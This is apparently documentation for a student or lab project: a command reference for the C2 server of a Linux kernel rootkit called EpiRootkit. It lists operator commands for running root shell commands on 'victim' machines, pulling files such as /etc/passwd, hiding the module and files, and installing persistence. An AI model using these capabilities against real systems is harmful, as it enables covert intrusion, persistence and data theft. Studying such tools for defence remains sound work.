---
title: "Command Reference"
description: "Complete reference for all C2 server commands"
icon: "terminal"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 303
---

# Command Reference

Complete reference for all C2 server commands.

## Command List

| Command | Description | Auth Required |
|---------|-------------|---------------|
| `clients, ls` | List connected clients | No |
| `auth <client> <password>` | Authenticate with client | No |
| `exec <client> <command>` | Execute shell commands | Yes |
| `upload <client> <local> [remote]` | Upload files to victim | Yes |
| `download <client> <remote> [local]` | Download files from victim | Yes |
| `status <client>` | Get rootkit status | Yes |
| `keepalive <client>` | Check connection status | Yes |
| `persist <client> [action]` | Manage persistence | Yes |
| `config <client>` | Interactive configuration | Yes |

## Client Management

### List Clients
```bash
ls               # List all connected clients
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM


```

### Authentication
```bash
auth Client-1 password     # Authenticate with client
# ✓ [2025-05-25 16:13:29] Authenticated
# SUCCESS: Authentication successful

auth Client-1 wrongpass    # Wrong password
# ERROR: Authentication failed
```

**Security Features:**
- SHA-512 password hashing
- Rate limiting (5 attempts/60 seconds)
- Session timeout (1 hour)

## Command Execution

```bash
exec Client-1 whoami
exec Client-1 uname -a
exec Client-1 ps aux | head -5
```

**Features:**
- Root privileges execution
- Full stdout/stderr capture
- Exit code display
- Real-time output

## File Transfer

```bash
# Upload files
upload Client-1 ./file.txt /tmp/file.txt    # Upload to specific path
upload Client-1 ./script.sh                 # Upload to current directory

# Download files
download Client-1 /etc/passwd ./passwd      # Download to specific path
download Client-1 /etc/hostname             # Download to current directory
```

**Features:**
- Base64 encoding
- Path validation
- Binary/text file support
- Automatic path resolution

## System Information

### Status Check
```bash
status Client-1
# EpiRootkit Status:
# Version: 1.0.0
# Authentication: YES
# Connection: CONNECTED
# Module Hidden: YES
# File Hiding: YES
# Persistence: ENABLED
```

### Connection Check
```bash
keepalive Client-1
# Keepalive Status:
# Last ping: 2025-05-25 16:14:00
# Last pong: 2025-05-25 16:14:00
# Failed pings: 0
# Connection: STABLE
```

## Persistence Management

```bash
persist Client-1 install    # Install all mechanisms
persist Client-1 remove     # Remove all mechanisms
persist Client-1 modules    # modules-load.d only
```

## Configuration

### Interactive Config
```bash
config Client-1
# ┌─ Configuration - Client-1
#   Current Configuration:
#   [X] Module Hiding (Click to disable)
#   [X] File Hiding (Click to disable)
#   [X] Persistence (Click to disable)
#   
# ? Select option: [Use arrow keys]
```
**Available Settings:**
- Module hiding toggle
- File hiding toggle
- Persistence management
- Connection parameters

### Direct Commands
```bash
hide_module Client-1      # Hide rootkit module
unhide_module Client-1    # Show rootkit module
hide_files Client-1       # Enable file hiding
unhide_files Client-1     # Disable file hiding
```

## Error Handling

For detailed usage examples, see [Usage Guide](./usage.md).